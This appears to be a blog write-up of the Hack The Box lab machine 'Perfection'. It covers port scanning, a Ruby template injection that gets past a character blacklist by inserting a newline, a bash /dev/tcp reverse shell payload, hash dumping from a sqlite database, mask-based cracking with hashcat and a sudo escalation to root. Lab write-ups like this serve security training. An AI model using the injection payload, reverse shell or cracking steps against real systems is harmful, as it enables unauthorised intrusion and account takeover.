---
layout: writeup
category: HTB
description: Perfection is a easy linux machine which starts with a ruby SSTI in a grade calculator combined with a CRLF injection to bypass restrictions. Once, we have access as susan to the linux machine, it's possible to see a mail from Tina that tells Susan how to generate her password. Using this information and cracking the hash from a sqlite database we can obtain password for susan and use it to execute any command as root because we belong to the sudo group.
points: 20
solves: 10202
tags: ssti ruby crlf-injection sqlite hash-cracking sudo-group
date: 2024-07-06
title: HTB Perfection writeup
comments: false
---

Perfection is a easy linux machine which starts with a ruby SSTI in a grade calculator combined with a CRLF injection to bypass restrictions. Once, we have access as susan to the linux machine, it's possible to see a mail from Tina that tells Susan how to generate her password. Using this information and cracking the hash from a sqlite database we can obtain password for susan and use it to execute any command as root because we belong to the sudo group.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.253
# Nmap 7.94SVN scan initiated Sat Jul  6 16:34:55 2024 as: nmap -sS -sVC --open --min-rate 5000 -v -n -Pn -p- -oN perfection 10.10.11.253
Nmap scan report for 10.10.11.253
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  6 16:35:14 2024 -- 1 IP address (1 host up) scanned in 19.47 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

We can see port 22 for ssh and 80 for http.

## Web enumeration
            
First, looking at the headers, we can see that the server consists of a webrick (ruby), which is something we will need later:

```bash
❯ curl -v http://10.10.11.253
*   Trying 10.10.11.253:80...
* Connected to 10.10.11.253 (10.10.11.253) port 80
> GET / HTTP/1.1
> Host: 10.10.11.253
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Sat, 06 Jul 2024 14:38:21 GMT
< Content-Type: text/html;charset=utf-8
< Content-Length: 3842
< Connection: keep-alive
< X-Xss-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
<..SNIP..>
```

Taking a look to the web, its possible to see that it's a tool to calculate the total grade in a class:

![main page](/assets/images/Perfection/main-web-page.png)

Clicking "Calculate your weighted grade" and entering data, we can see that the categories are reflected in the page:

![reflected values calculating](/assets/images/Perfection/reflected-values-calculating.png)

I will intercept with burpsuite and send it to repeater to test for [ruby SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) (because it's ruby), but the characters (remember to urlencode it) are blacklisted:

![Input blocked](/assets/images/Perfection/input-blocked.png)

However, inserting a string and %0a (which is a line feed urlencoded) before the payload works. This is known as CRLF injection:

![CRLF injection works](/assets/images/Perfection/crlf-injection-works.png)

# Access as susan

Now we can insert a payload to gain access to the machine via reverse shell after spawning a nc listener:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

![Reverse shell](/assets/images/Perfection/reverse-shell.png)

> SSTI Payload used: ```<%= system('bash -c "bash -i >& /dev/tcp/10.10.15.19/443 0>&1"') %>```

We successfully gained access as susan:

```bash
connect to [10.10.15.19] from (UNKNOWN) [10.10.11.253] 45704
bash: cannot set terminal process group (993): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ 
```

Now do the common tty trick to having a completely interactive shell, do ctrl+c, ctrl+l, etc:

```bash
susan@perfection:~/ruby_app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
susan@perfection:~/ruby_app$ ^Z
[1]  + 38875 suspended  nc -lvnp 443
❯ stty raw -echo;fg
[1]  + 38875 continued  nc -lvnp 443
                                    reset xterm
susan@perfection:~/ruby_app$ export TERM=xterm
susan@perfection:~/ruby_app$ export SHELL=bash
susan@perfection:~/ruby_app$ stty rows 50 cols 184
```

* ``script /dev/null -c bash``: Spawns a tty
* ``ctrl+z``: puts the shell in background for later doing a treatment
* ``stty raw -echo; fg``: give us the shell back again
* ``reset xterm``: resets the terminal to give us the bash console
* ``export TERM=xterm``: let us do ctrl+l to clean the terminal
* ``export SHELL=bash``: specifies the system that we are using a bash console

And we can see user.txt:

```bash
susan@perfection:~/ruby_app$ cd ~
susan@perfection:~$ cat user.txt 
5f****************************3e
```

# Privilege escalation to root

In the Migration directory, we have a sqlite database where we can extract some hashes:

```bash
susan@perfection:~$ cd Migration/
susan@perfection:~/Migration$ ls
pupilpath_credentials.db
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite>
```

```bash
sqlite> .tables
users
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

This hashes are SHA256. However they are not crackable with rockyou:

```bash
❯ cat hashes.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hashes.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ susan:abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
   2   │ tina:dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
   3   │ harry:d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
   4   │ david:ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
   5   │ stephen:154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ john -w=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2024-07-06 17:13) 0g/s 12693Kp/s 12693Kc/s 63466KC/s -sevim-..*7¡Vamos!
Session completed. 
```

Something important to take into accounts is that we belong to the sudo group, so if we manage to get susan password, we can execute any command as root:

```bash
susan@perfection:~/Migration$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

Looking at the mail of susan, we can see that tina is advising susan that she needs to update his password due to a migration, and we have the format needed:

```bash
susan@perfection:~/Migration$ cat /var/mail/susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

I will use hashcat to specify the format and try to crack it:

```bash
❯ hashcat -m 1400 -a 3 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f' 'susan_nasus_?d?d?d?d?d?d?d?d?d'
hashcat (v6.2.6) starting

<..SNIP..>

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Sat Jul  6 17:29:15 2024 (2 mins, 4 secs)
Time.Estimated...: Sat Jul  6 17:31:19 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2823.6 kH/s (0.37ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324558848/1000000000 (32.46%)
Rejected.........: 0/324558848 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_803824210
Hardware.Mon.#1..: Util: 49%

Started: Sat Jul  6 17:29:00 2024
Stopped: Sat Jul  6 17:31:20 2024
```

> Note: -a 3 is to specify bruteforce mode and ?d is for digits

And we have the password! Now you can execute bash as root and see root.txt:

```bash
susan@perfection:~/Migration$ sudo bash
[sudo] password for susan: susan_nasus_413759210
root@perfection:/home/susan/Migration# cd ~
root@perfection:~# cat root.txt
e4****************************ec
```

That's the machine, hope you liked it! :)
